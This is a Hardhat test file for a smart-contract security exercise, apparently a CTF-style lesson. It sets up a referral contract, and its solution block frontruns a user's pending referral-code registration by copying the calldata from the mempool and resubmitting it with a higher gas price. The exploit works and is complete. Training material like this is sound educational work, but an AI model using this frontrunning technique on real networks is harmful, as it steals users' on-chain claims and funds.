import {ethers, network} from 'hardhat';
import {expect} from 'chai';
import {SignerWithAddress} from '@nomicfoundation/hardhat-ethers/signers';
import {Referrals} from '../../typechain-types';

const {provider, deployContract, getSigners, parseEther, keccak256} = ethers;

/**
 * @dev run "npx hardhat test test/frontrunning-2/tests.ts"
 */
describe('Frontrunning Attack Exercise 2', function () {
  let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;

  let referrals: Referrals;

  let referralCode: string;

  before(async function () {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, user, attacker] = await getSigners();

    // Deploy contract
    referrals = await deployContract('Referrals');
    await provider.send('evm_mine', []);

    // Send some random tx's
    for (let i = 0; i < 100; i++) {
      await deployer.sendTransaction({
        to: ethers.Wallet.createRandom().address,
        value: parseEther('0.01'),
      });
    }

    // Assign referal code to user
    referralCode = keccak256(user.address);
    await referrals.connect(user).createReferralCode(referralCode);
  });

  it('Exploit', async function () {
    /** CODE YOUR SOLUTION HERE */
    const {transactions} = await network.provider.send('eth_getBlockByNumber', ['pending', true]);
    const referralsAddress = await referrals.getAddress();
    const tx = transactions.find((tx: any) => {
      return tx.to.toLowerCase() === referralsAddress.toLowerCase();
    });

    await attacker.sendTransaction({
      to: referralsAddress,
      data: tx.input,
      gasPrice: tx.gasPrice + 1,
      gasLimit: tx.gas,
    });
  });

  after(async function () {
    // Mine all the transactions
    await provider.send('evm_mine', []);

    // Attacker should steal the user's refferal code
    expect(await referrals.getReferral(referralCode)).equals(attacker.address);
  });
});
